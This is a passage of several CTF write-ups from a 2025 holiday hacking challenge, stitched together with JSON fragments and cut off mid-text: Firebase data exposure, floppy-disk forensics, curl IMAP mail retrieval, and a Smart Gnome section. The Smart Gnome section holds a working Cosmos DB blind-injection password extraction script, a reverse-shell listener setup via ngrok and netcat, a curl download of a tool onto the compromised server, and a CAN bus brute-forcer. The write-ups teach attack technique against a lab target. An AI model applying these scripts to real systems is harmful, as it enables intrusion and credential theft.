I have no idea why people keep telling me that, but it sounds fine in my head, to be honest.\nAnyway, way back before I joined Counter Hack, I was an avid HHC player just like you! Some of my write-ups even resulted in a couple of wins throughout the years. Definitely check them out if you’re looking for some inspiration.\nIf you decide to submit your own report, my Holiday Hack Challenge report template might help you save some time as well.\nMy t-shirt? You like it? Well, Synthwave, cyberpunk, and even cassette futurism are definitely my kinda jam!\nI also love to tinker, but for some weird reason my drawer of unfinished hacking projects just keeps overflowing. 24 hours in a day simply isn’t enough time, I guess.\nOh… and no matter what Mark or Kevin try to tell you, the Amiga is the absolute best retro computing platform ever made!\nHi again. Say, you wouldn’t happen to have time to help me out with something?\nThe gnomes have been oddly suspicious and whispering to each other. In fact, I could’ve sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said “passphrase denied”. I asked what that was all about but it just giggled and ran away.\nI know they’ve been using GnomeTea to “spill the tea” on one another, but I can’t sign up ‘cause I’m obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.\nI’ve tried a few things already, but as usual the whole… Uh, what’s the word I’m looking for here? Oh right, “endeavor”, ended up with the rest of my unfinished projects.\nSolution Upon entering this mission we are presented with a website:\nWe have got a login form - usually in CTF’s these sometime reveal relevant error messages. Let’s see if we can provoke one by simply logging in with some random value:\nSure it does, of course it does. Somehow there is an Firebase data base lurking in the backend. Since Firebase is more than often coupled with Javascript, we look for some hints in the HTML source for some references. By inspecting the HTML source I see one interesting Javascript called https://gnometea.web.app/assets/index-BVLyJWJ_.js, and it does contain references to Firebase:\nInvestigation using Chat GPT The Javascript is heavily minified and difficult to read. Since we live in the AI era, I uploaded the Javascript to ChatGPT and issued the following prompt:\nAnd bingo! We have extracted gold!\nChatGPT output The file contains references to multiple Firestore collections and a Firebase Storage bucket. These were extracted from calls such as:\nhs(er, \"collectionName\") Ro(hs(er, \"collectionName\")) Yf(er, \"collectionName\", ...) 1. Firestore Collections (Name + Description) Collection Description gnomes Used in the app to store metadata about gnome entities, likely linked to profile avatars or characters. Extracted from repeated references to hs(er,\"gnomes\"). tea Appears to store “tea posts” or messages shown in the “tea feed”. Used in UI rendering. dms Direct messages between users. Extracted from hs(er,\"dms\") being passed into message components. admins Holds admin user records or permissions. Access checks reference this collection. users Primary user profiles (names, avatars, IDs, roles). Extensively referenced throughout the code. notifications Stores notification events for users. Seen in UI for listing alerts. These six collections are the only ones referenced in the JS bundle.\n2. Endpoints to View Each Collection Using your Firebase project ID discovered (holidayhack2025), the Firestore REST API allows direct unauthenticated GET requests if the database rules are permissive.\nTemplate:\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/\u003ccollection\u003e Here are all collections with ready-to-use URLs:\nCollection URL gnomes https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes tea https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea dms https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms admins https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/admins users https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/users notifications https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/notifications To list all root-level collections:\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents 3. Endpoints to View Firebase Storage Bucket Contents The JS file shows the bucket:\nholidayhack2025.firebasestorage.app Firebase Storage REST API uses the following format:\nList all items in bucket https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o List items under a specific folder https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o?prefix=\u003cfolder\u003e/ Download a file (if public) https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/\u003cpath\u003e?alt=media Get metadata for a file https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/\u003cpath\u003e Back to manual investigation Manual inspection As we can see from the previous section, ChatGPT is quite capable of extracting interesting information from obfuscated information. However, as a side note, the HTML code of the landingpage also gives away hints on collection:\n\u003c!-- TODO: lock down dms, tea, gnomes collections --\u003e There are many interesting collections to look at it turns out. However, dms caught my interest the most.\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms By reading through the various messages passing back and forth I found out that a gnome named Barnaby Briefcase has forgotten his password. He reached out to Glitch Mitnick to reset it. Barnaby is reluctant to give out his password, but he gives out a hint:\nSorry, I can’t give you my password but I can give you a hint. My password is actually the name of my hometown that I grew up in. I actually just visited there back when I signed up with my id to GnomeTea (I took my picture of my id there).\"\nThe full conversation:\nThat hint sounds interesting. From the looks of it, his ID is a file somewhere. Most likely somewhere in this bucket (which I found as mentioned above using ChatGPT):\nhttps://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o A simple look into it reveals a lot of files and they are organized in a non easy searchable way. Luckily we have found an endpoint that list out every gnome in much simpler way:\nhttps://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes We search for Barnaby and finds his record:\nFrom the screenshot above we se an URL for the drivers license. However, that link doesn’t work. We have to rewrite it slighty to:\nhttps://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media Then we get the drivers license:\nBy looking at the meta data of the drivers license, we get a GPS coordinate. Here I have used Pic2Map:\nBy the looks of it Barnabys hometown is Gnomesville. That is supposedly the password we’re looking for. In order to find Barnabys email we need to look it up in https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes:\nbarnabybriefcase@gnomemail.dosis Using that email and that password (in lowercase) we were able to log in:\nChatGPT mentioned something about an “admins” collection. If this exists, then surely there must be an /admin section to this site. Visting https://gnometea.web.app/admin, we see the following error:\nIt complains that window.ADMIN_UID: not set is not set, so we set it and see what happens:\nAnd boom! We’re admin:\nBy scrolling down we find the secret pass phrase: GigGigglesGiggler\nThomas Bouve mission debrief Excellent! Now we can communicate with the gnomes. When I tried to talk to one just now it said “passphrase accepted”.\nI asked what they were up to and it said something about going to the old warehouse/data center at the appointed time for the next meeting. No clue what that means though.\nAnyhoo, that’s a pretty big item you helped remove from my pile of unfinished hacking projects. I really appreciate the assist!",

    "content": "Objective Difficulty: 2/5\nJoin Mark in the retro shop. Analyze his disk image for a blast from the retro past and recover some classic treasures.\nMark DeVito mission statement I am an avid collector of things of the past. I love old technology. I love how it connects us to the past. Some remind me of my dad, who was an engineer on the Apollo 11 mission and helped develop the rendezvous and altimeter radar on the space craft.\nIf you ever get into collecting things like vintage computers, here is a tip. Never forget to remove the RIFA capacitors from vintage computer power supplies when restoring a system. If not they can pop and fill the room with nasty smoke.\nI love vintage computing, it’s the very core of where and when it all began. I still enjoy writing programs in BASIC and have started re-learning Apple II assembly language. I started writing code in 1982 on a Commodore CBM.\nSometimes it is the people no one can imagine anything of who do the things no one can imagine. - Alan Turing\nYou never forget your first 8-bit system.\nThere’s something in the works. Come see me later and we’ll talk.\nWhile Kevin and I were cleaning up the Retro Store, we found this FAT12 floppy disk image, must have been under this arcade machine for years. These disks were the heart of machines like the Commodore 64. I am so glad you can still mount them on a modern PC.\nWhen I was a kid we shared warez by hiding things as deleted files.\nI remember writing programs in BASIC. So much fun! My favorite was Star Trek.\nThe beauty of file systems is that ‘deleted’ doesn’t always mean gone forever.\nReady to dive into some digital archaeology and see what secrets this old disk is hiding?\nGo to Items in your badge, download the floppy disk image, and see what you can find!\nSolution Identify the Filesystem Format Command file floppy.img What the command does file inspects the binary header of a file and determines its type based on internal signatures. For disk images, this reveals the boot sector format, the filesystem, and other metadata. This is the quickest way to understand what you’re working with before attempting any forensic recovery.\nOutput floppy.img: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", root entries 224, sectors 2880 (volumes \u003c=32 MB), sectors/FAT 9, sectors/track 18, reserved 0x1, serial number 0x9c01e8ae, unlabeled, FAT (12 bit), followed by FAT Why this output matters This confirms the disk is a 1.44MB FAT12 floppy image, which aligns perfectly with the retro-computing context. FAT12 is simple, and deleted file recovery works reliably—exactly what the challenge hints suggested.\nScan for Embedded Data or Hidden Binaries Command binwalk floppy.img What the command does binwalk scans a binary file for recognizable signatures (compressed files, strings, executables, archives, etc.). This helps determine whether the hidden content is embedded somewhere outside the filesystem.\nOutput DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 133776 0x20A90 Copyright string: \"Copyright Microsoft Corporation 1982-1988.\" 143535 0x230AF Copyright string: \"Copyright (C) Microsoft Corp 1982-1987. All rights reserved.\" 222225 0x36411 Copyright string: \"Copyright Microsoft Corporation, 1982-1988.\" 258196 0x3F094 Copyright string: \"Copyright (C) Microsoft Corp 1983-1988. %s.\" 327297 0x4FE81 Copyright string: \"Copyright (C) Microsoft Corp 1983-1988. %s.\" 343826 0x53F12 Copyright string: \"Copyright (C) Microsoft Corp 1983-1988. All rights reserved.\" 614815 0x9619F Copyright string: \"Copyright Microsoft Corporation, 1985-1988.\" Why this output matters The scan shows only DOS copyright strings. No hidden archives or payloads exist in raw sectors. This strongly suggests the hidden clue is inside the filesystem, not outside it.\nExamine the FAT12 Filesystem Structure Command fsstat floppy.img What the command does fsstat (Sleuth Kit) prints a complete map of the filesystem: FAT offsets, root directory location, cluster sizes, and layout. This is vital for knowing where deleted files live and how to extract them.\nOutput FILE SYSTEM INFORMATION -------------------------------------------- File System Type: FAT12 OEM Name: mkfs.fat Volume ID: 0x9c01e8ae Volume Label (Boot Sector): NO NAME Volume Label (Root Directory): File System Type Label: FAT12 Sectors before file system: 0 File System Layout (in sectors) Total Range: 0 - 2879 * Reserved: 0 - 0 ** Boot Sector: 0 * FAT 0: 1 - 9 * FAT 1: 10 - 18 * Data Area: 19 - 2879 ** Root Directory: 19 - 32 ** Cluster Area: 33 - 2879 METADATA INFORMATION -------------------------------------------- Range: 2 - 45782 Root Directory: 2 CONTENT INFORMATION -------------------------------------------- Sector Size: 512 Cluster Size: 512 Total Cluster Range: 2 - 2848 FAT CONTENTS (in sectors) -------------------------------------------- 93-93 (1) -\u003e EOF 94-284 (191) -\u003e EOF 285-436 (152) -\u003e EOF 437-506 (70) -\u003e EOF 507-642 (136) -\u003e EOF 643-671 (29) -\u003e EOF 672-690 (19) -\u003e EOF 691-1235 (545) -\u003e EOF 1236-1236 (1) -\u003e EOF Why this output matters The root directory only covers sectors 19–32, so deleted file entries will be easy to enumerate. Cluster size is 512 bytes, making carving straightforward.\nList Everything in the Filesystem (Including Deleted Markers) Command fls -r floppy.img What the command does fls lists files inside the filesystem.\nThe -r flag prints them recursively. Deleted entries appear with an asterisk *. Output r/r * 6: all_i-want_for_christmas.bas d/d 8: qb45 + r/r 1189: BC.EXE + r/r 1190: BRUN45.EXE + r/r 1191: LIB.EXE + r/r 1192: LINK.EXE + r/r 1193: MOUSE.COM + r/r 1196: PACKING.LST.txt + r/r 1197: QB.EXE + r/r 1198: QB.INI r/r * 10: .all_i-want_f v/v 45779: $MBR v/v 45780: $FAT1 v/v 45781: $FAT2 V/V 45782: $OrphanFiles Why this output matters Two deleted files jump out:\nall_i-want_for_christmas.bas .all_i-want_f Both are likely hiding the challenge solution.\nList Only Deleted Files Command fls -rd floppy.img What the command does Adds -d, which filters to show deleted entries only. This clarifies which files require recovery.\nOutput r/r * 6: all_i-want_for_christmas.bas r/r * 10: .all_i-want_f Why this output matters These are the only two deleted files. This matches the retro computing hint about “hiding things as deleted files”.\nRecover the Deleted Files Commands icat floppy.img 6 \u003e all_i-want_for_christmas.bas icat floppy.img 10 \u003e all_i-want_f What the commands do icat extracts file content directly from its inode/record number, independent of whether it is deleted. This avoids relying on the operating system and ensures a clean carve from disk clusters.\nWhy this matters Now we can analyze the contents of the hidden files.\nInspect the Small Deleted File Command strings all_i-want_f What the command does strings prints printable ASCII sequences. Useful for scanning binary or partially overwritten files for readable content.\nOutput b0nano 7.2 mark arcade all_i-want_for_christmas.bas Why this output matters The content is minimal, but it directly references the BASIC program. This hints that the real clue is inside all_i-want_for_christmas.bas.\nInspect the Large BASIC Program Command strings all_i-want_for_christmas.bas What the command does Shows all readable strings in the recovered BASIC file, which appears to be a Star Trek-style text game.\nRelevant Output A full Star Trek BASIC program appears, and inside it is a Base64-encoded line (line 211).\nWhy this output matters The encoded string is clearly placed as a hidden message embedded in the program. This is the actual target of the challenge.\nDecode the Hidden Base64 Payload Command echo \"bWVycnkgY2hyaXN0bWFzIHRvIGFsbCBhbmQgdG8gYWxsIGEgZ29vZCBuaWdodAo=\" | base64 -d What the command does Decodes Base64 into plain text.\nOutput merry christmas to all and to all a good night Why this output matters This is the exact hidden message embedded in the recovered program. It serves as the challenge solution / flag.\nFinal Flag merry christmas to all and to all a good night\nMark DeVito mission debrief Excellent work! You’ve successfully recovered that deleted file and decoded the hidden message.\nSometimes the old ways are the best ways. Vintage file systems never truly forget what they’ve seen. Play some Star Trek… it actually works.",

Chris Daves mission statement Hi, my name is Chris.\nI like miniature war gaming and painting minis.\nI enjoy open source projects and amateur robotics.\nHiking and kayaking are my favorite IRL activies.\nI love single player video games with great stoylines.\nHey, I could really use another set of eyes on this gnome takeover situation.\nTheir systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!\nBut every system has weaknesses if you know where to look.\nIf these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.\nReady to help me turn one of these rebellious bots against its own kind?\nSolution This objective is hosted on https://hhc25-smartgnomehack-prod.holidayhackchallenge.com. Upon entering it I were presented with the following landingpage:\nNot much information to begin with, but in tradition with other CTF’s I started inspecting the sources. Early on I also retrieved all hints for this objective. These are included at the very end of this writeup.\nInspecting SMART GNOME CONTROL source code In the HTML source I found an interesting Javascript file: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js. By reading it I was able to uncover few interesting endpoints:\nEndpoint Description /register Endpoint for registering a new user /userAvailable?username= In use to check wheter a username is available for registion upon creating a new user Enumerating database From the looks of it the only endpoint taking arguments is /userAvailable. By performing a standard test by supplying a single quotation mark I was able to trigger an error message that disclosed which database I were facing:\nhttps://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=\" Output: {\"error\":\"An error occurred while checking username: Message: {\\\"errors\\\":[{\\\"severity\\\":\\\"Error\\\",\\\"location\\\":{\\\"start\\\":44,\\\"end\\\":45},\\\"code\\\":\\\"SC1012\\\",\\\"message\\\":\\\"Syntax error, invalid string literal token '\\\\\\\"'.\\\"}]}\\r\\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0\"} The error message did not state it was Cosmos DB in cleartext - however I used ChatGPT to confirm it.\nEnumerating users From the hints I now switched focus to enumerating users in order to log in. By looking at the output from the /userAvailable this seemed like a trivial task, given that the endpoint happily returns boolean states. I decided on using FFUF with a list of common names from Seclists:\nffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -X GET -fr \"true\" Since the feedback from the enpoint basically states available: true or false, thus I added the -fr option to find users not available. The following users were identified:\nbruce harold Finding passwords I now had a list of users but no passwords. My next move was to find their passwords, but first I had some reading up to do on Cosmos DB. After reading some query examples on the Net, it became apparent that queries are written much like this example:\nSELECT * FROM p WHERE p.something = something The FROM refers to a container or item alias and from the examples I found tends to be a single letter. Further, Cosmos DB doesn’t have a fixed schema, so fields can in reality be named whatever. Based on this I formed the following workflow:\nIdentify what the container or item alias could be Identify whcih fields were in use Extract passwords For this excercise I decided to leave FFUF be an move on to Python. Working with Python, or any programming languages, is worth gold in CTF’s. By using scripts we can easily recreate our methodology consistently. The script is rather basic. It has three core functions:\nFunction Description find_prefix Identify the container or item alias by simply bruteforcing it using the alphabet (limited to one char as examples on the Net shows) find_password_field After findintg the contaier or item alias I use a wordlist containing Burp parameter names to uncover what the name of the password field is. I tried to use ‘password’ directly, but it didn’t exist. find_digest With both the container or item alias, and the name of the ‘password’ field (digest), I bruteforce the password string using an recursive function looping over lower case letters, numbers and ‘-’ The script looks like this:\nimport requests import urllib.parse import string import sys from pprint import pprint # # Helper function for injection # def inject(base_url: str, payload: str) -\u003e str: url = base_url + urllib.parse.quote_plus(payload) r = requests.get(url) return r.json() # # Map out prefix # def find_prefix(url, username): prefix_letter = None for prefix in string.ascii_letters: payload = f'{username}\" AND IS_DEFINED({prefix}.username) --' result = inject(base_url, payload) if \"error\" in result.keys(): continue prefix_letter = prefix break return prefix_letter # # Find password field name # def find_password_field(url, username, prefix): fields = [] with open(\"burp-parameter-names.txt\", \"r\") as f: for line in f.readlines(): needle = line.strip(\"\\n\") payload = f'{username}\" AND IS_DEFINED({prefix}.{needle}) --' result = inject(url, payload) if \"error\" in result.keys(): continue if result.get(\"available\") is False: fields.append(needle) return fields # # Find digest # def find_digest(base_url, prefix, candidate=\"\", username=\"\"): for c in string.ascii_lowercase + string.digits + \"-\": if c in [\":\"]: continue p = candidate + c payload = f'{username}\" AND STARTSWITH({prefix}.digest, \"{p}\") --' result = inject(base_url, payload) print(payload) if result[\"available\"] is False: print(p) find_digest(base_url, prefix, p, username) break # # Main logic # base_url = \"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=\" prefix = find_prefix(base_url, \"harold\") fields = find_password_field(base_url, \"harold\", prefix) print(\"Prefix is: {prefix}\") print(\"Document fields is: \") print(\"\\n*\".join(fields)) find_digest(base_url, prefix, \"\", \"harold\") find_digest(base_url, prefix, \"\", \"bruce\") The script uncovers the following:\nThe contaier or item alias is actually c The password field is named digest By bruteforcing the digest field I found these passwords:\nUsername Digest (MD5) Decoded bruce d0a9ba00f80cbc56584ef245ffc56b9e oatmeal12 harold 07f456ae6a94cb68d740df548847f459 oatmeal!! The digest (passwords) were stored as MD5 - these were easily decoded by looking them up on Crackstation.\nThe control panel - endpoints Upon logging in to the control panel I were presented with the following landingpage:\nAs usual I started with inspecting the HTML and Javascript source code to reveal the following endpoints:\nEndpoint Description /home Mainpage, contains two iframes, one for Smart Gnome Statistics panel and Gnome Control Interface /stats Smart Gnome Statistics panel /control Gnome Control Interface - where the robot game plays out /register Endpoint for registering a new user /ctrlsignals?message= This is used to communicate with backend, for instance updating the robot name. Takes an urlencoded JSON object as input to ‘message’ argument The control panel - exploitable vector From the endpoints I saw that there was just one endpoint taking any form of input, /ctrlsignals. I knew from the hints that I were facing prototype poisoning, and this endpoint seemed to fit the bill. So the hunt began.\nAt first I figured out that if I sent a single apostrophe (’) I could make the system fail at the input parsing/decoding step:\nSyntaxError: Unexpected token ' in JSON at position 0 at JSON.parse (\u003canonymous\u003e) at /app/server.js:121:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:149:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:284:15 at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12) at next (/app/node_modules/express/lib/router/index.js:280:10) at /app/server.js:49:9 From this I learned that I was dealing with express.js and one common templating engine in use is EJS.

Stats page =========================================== ... snip ... In the initial development phase of my payload I made the server reach out to a webhook.site page on the Internet. This provided an excellent way to verify that the server could reach the Internet. Once that was done I simply changed over to using an Ngrok infrastucture with a netcat listener.\nSetup attack infrastructure As mentioned, my plan was to make the server connect back to me using a reverse shell. In order to do that I had to set up an infrastructure of\nReverse shell listener Web server to deliver scripts and utilities The infrastructure I landed up was based on Ngrok and Kali in WSL (in total four instances):\nCommand Public Description ngrok tcp 8501 Yes Public exposed reverse shell port through Ngrok nc -lnvp 8501 No Local (attacking machine) listening port using Netcat mapped to public Ngrok bridge ngrok http 8001 Yes Public exposed web server for serving scripts python3 -m http.server 8001 No Local (attacking machine) web server mapped to public Ngrok bridge The architecture ended up looking like this:\n--- config: theme: redux --- flowchart LR subgraph Attacker[\"Attacking machine\"] webserver netcat end subgraph NGROK[\"NGROK\"] HTTP TCP end SGCC[\"Smart Gnome Control Center\"] \u003c--TCP/443--\u003e HTTP SGCC[\"Smart Gnome Control Center\"] \u003c--TCP/19342--\u003e TCP HTTP \u003c--TCP/8001--\u003e webserver[\"Python webserver\"] TCP \u003c--TCP/8501--\u003e netcat[\"Netcat listener\"] Regarding the HTTP server, this was merely used as a transport utility using curl for transferring my scripts back and forth and related commands to this will not be covered in this writeup.\nThe attack After having set up the architecture and issued the payloads, the server called back and got myself a shell. I immediately started to have a look around:\nA lot of junk, but the canbus_client.py seemed relevant:\nIt truned out this was a script to interact with the CAN bus and contained a COMMAND_MAP with codes I recognized from the error messages for the bot in the Gnome Control Center. All of the mentioned codes were associated with errors, and the comment in code mentioned they were wrong. I then turned my attention to the README.md file:\nA whole lot of text, but only the very last part was actually of interest. It basically stated the codes to move the robot was unknown at the moment. So - I needed to figure out these codes on my own.\nEnumerating control codes In order to find the correct control codes, I took basis in the Python script on the server, uploaded it to and asked ChatGPT to make it into a bruteforcing script. This script was then uploaded back onto the server using the command:\ncurl -o cb.py https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py I had to run this script in several iterations due to the amount of HEX codes involved. adjusting the HEX range for each run. For each iteration I kept an eye on the robot in Gnome Control Interface for any movement. After some runs I had narrowed the codes down to the 0x200-0x206 range. The script below is the final revision for that range:\n#!/usr/bin/env python3 import time import struct import can IFACE = \"gcan0\" RPM_LEFT_ID = 0x310 RPM_RIGHT_ID = 0x311 # LIMIT THE SEARCH RANGE HERE (end is exclusive) SCAN_START = 0x200 SCAN_END = 0x206 # includes 0x205 def int16_be(b: bytes) -\u003e int: return struct.unpack(\"\u003eh\", b[:2])[0] def read_rpm_snapshot(bus, window_s=0.20): end = time.time() + window_s left = right = None while time.time() \u003c end: msg = bus.recv(timeout=0.02) if not msg: continue if msg.arbitration_id == RPM_LEFT_ID and len(msg.data) \u003e= 2: left = int16_be(msg.data) elif msg.arbitration_id == RPM_RIGHT_ID and len(msg.data) \u003e= 2: right = int16_be(msg.data) return left, right def rpm_changed(before, after, threshold=30): if None in before or None in after: return False return abs(after[0] - before[0]) \u003e= threshold or abs(after[1] - before[1]) \u003e= threshold def send_frame(bus, arb_id, data: bytes, extended=False): msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=extended) bus.send(msg) def scan(bus, start, end, payloads, extended=False, rate_sleep=0.03, verbose_every=1): hits = [] _ = read_rpm_snapshot(bus, 0.30) # prime attempt = 0 for arb_id in range(start, end): for data in payloads: attempt += 1 if verbose_every and attempt % verbose_every == 0: # OUTPUT EXACTLY WHAT WE'RE TRYING print(f\"TRY id=0x{arb_id:03X} dlc={len(data)} data={data.hex() or '(empty)'}\") before = read_rpm_snapshot(bus, 0.12) try: send_frame(bus, arb_id, data, extended=extended) except can.CanError: continue after = read_rpm_snapshot(bus, 0.22) if rpm_changed(before, after): print(f\"HIT id=0x{arb_id:03X} data={data.hex() or '(empty)'} RPM {before}-\u003e{after}\") hits.append((arb_id, data, before, after)) time.sleep(rate_sleep) return hits def main(): bus = can.interface.Bus(channel=IFACE, interface=\"socketcan\", receive_own_messages=False) payloads = [ b\"\", # empty b\"\\x00\", b\"\\x01\", b\"\\xFF\", b\"\\x00\\x00\", b\"\\x14\\x14\", # +20,+20 b\"\\xEC\\xEC\", # -20,-20 b\"\\xEC\\x14\", # left -, right + b\"\\x14\\xEC\", # left +, right - ] print(f\"Scanning standard IDs 0x{SCAN_START:03X}-0x{SCAN_END-1:03X} ...\") hits = scan( bus, start=SCAN_START, end=SCAN_END, payloads=payloads, extended=False, rate_sleep=0.03, verbose_every=1, # set to e.g. 10 if too chatty ) print(f\"\\nDone.

In order to make use of it, I downloaded the canbus_client.py locally and entered my HEX codes in its COMMAND_MAP structure. Then reuploaded the script under a new name and ran it. It took some tries to get the mapping exactly right. In the end I ended up with this mapping that worked well:\nButton Canbus command id New Value w 0x656 0x201 a 0x658 0x203 s 0x657 0x202 d 0x659 0x204 In the final version I was able to navigate my robot through the maze using this command and directions:\npython3 script_name \u003cdirection\u003e Leading me to solving the objective:\nChris Davis mission debrief Excellent work! You’ve successfully taken control of the gnome - look at that interface responding to our commands now.\nTime to turn this little rebel against its own manufacturing operation and shut them down for good!\nHints Hint Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message. I actually helped design the software that controls the factory back when we used it to make toys. It’s quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome’s stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you’d have to start all over again). There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user’s entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it. Once you determine the type of database the gnome control factory’s login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack. Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome’s control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory’s pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages. Nice! Once you have command-line access to the gnome, you’ll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI. Resources This objective required extensive reading up on the whole __proto__ attack vector.

What is the URL of the pastebin service the gnomes are using?\nMaurice Wilson mission statement Hey there! I’m Mo, on loan from the Air Force, and let me tell you - Counter Hack is the best job I have ever had!\nThere is something in the works. Come see me later and we will talk. Can’t say much right now, but check back later. You might be interested.\nSo here’s our situation: those gnomes have been sending JavaScript-enabled emails to everyone in the neighborhood, and it’s causing chaos.\nWe had to shut down all the email clients because they weren’t blocking the malicious scripts - kind of like how we’d ground aircraft until we clear a security threat.\nThe only safe way to access the email server now is through curl - yes, the HTTP tool!\nThink you can help me use curl to connect to the IMAP server and hunt down one of these gnome emails?\nMail Detective: Curly IMAP Investigation To solve this objective, we must use curl as a lightweight IMAP client. Because curl supports IMAP natively, we can authenticate and talk directly to the mail server. The first step is to list the available mailboxes:\ncurl \"imap://localhost:143/\" -u \"dosismail:holidaymagic\" With no mailbox or message specified, curl sends an IMAP LIST command. This asks the server to return all mailboxes accessible to the user. The response looks like:\n* LIST (\\HasNoChildren) \".\" Spam * LIST (\\HasNoChildren) \".\" Sent * LIST (\\HasNoChildren) \".\" Archives * LIST (\\HasNoChildren) \".\" Drafts * LIST (\\HasNoChildren) \".\" INBOX Each line describes a single mailbox. The IMAP attribute \\HasNoChildren indicates that the folder has no subfolders, \".\" is the server’s hierarchy delimiter, and the final token is the mailbox name. This confirms that authentication succeeded and shows which folders we can query.\nWith the mailbox names in hand, we can start retrieving individual messages by their IMAP UID. For example:\ncurl \"imap://localhost:143/INBOX;UID=1\" -u \"dosismail:holidaymagic\" fetches the message with UID 1 from INBOX. I iterated through all messages in INBOX but found nothing useful. I then repeated the process for the other folders. It wasn’t until I inspected the Spam folder that I found something interesting:\ncurl \"imap://localhost:143/Spam;UID=2\" -u \"dosismail:holidaymagic\" The second message in the Spam folder contained the email I was looking for:\nReturn-Path: \u003cfrozen.network@mysterymastermind.mail\u003e Delivered-To: dosis.residents@dosisneighborhood.mail Received: from frost-command.mysterymastermind.mail (frost-command [10.0.0.15]) by mail.dosisneighborhood.mail (Postfix) with ESMTP id GHI789 for \u003cdosis.residents@dosisneighborhood.mail\u003e; Mon, 16 Sep 2025 12:10:00 +0000 (UTC) From: \"Frozen Network Bot\" \u003cfrozen.network@mysterymastermind.mail\u003e To: \"Dosis Neighborhood Residents\" \u003cdosis.residents@dosisneighborhood.mail\u003e Cc: \"Jessica and Joshua\" \u003csiblings@dosisneighborhood.mail\u003e, \"CHI Team\" \u003cchi.team@counterhack.com\u003e Subject: Frost Protocol: Dosis Neighborhood Freezing Initiative Date: Mon, 16 Sep 2025 12:10:00 +0000 Message-ID: \u003cgnome-js-3@mysterymastermind.mail\u003e MIME-Version: 1.0 Content-Type: text/html; charset=UTF-8 Content-Transfer-Encoding: 7bit \u003chtml\u003e \u003cbody\u003e \u003ch1\u003ePerpetual Winter Protocol Activated\u003c/h1\u003e \u003cp\u003eThe mysterious mastermind's plan is proceeding...

What is the name of the gnome?\nJosh Wright mission statement I’m a teetotling hacker.\nI sleep about 4 hours a night.\nPhotography is my hobby, but the anachronistic sort: before 1900.\nTeaching people how to hack and protect systems is my passion.\nI need your help with something urgent.\nA gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.\nBased on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.\nI was…at a talk recently…and learned some interesting things about some of these payment systems. Let’s use that receipt to dig deeper and unmask this gnome’s true identity.\nDid you see that receipt outside the door?\nIdorable Bistro Josh mentioned that there was a receipt outside the door. I went outside and to the right of the building and found this item:\nParsing the QR I found out that it leads to https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2:\nUpon visiting we are presented with the following webpage:\nUpon inspecting the HTML code we find something interesting in a Javascript:\nWe find that the current receipt ID is 103 and that the real endpoint is /api/receipt?id=${id}, which takes an id parameter. Toying with this I found a lower boundary of 100 and an upper 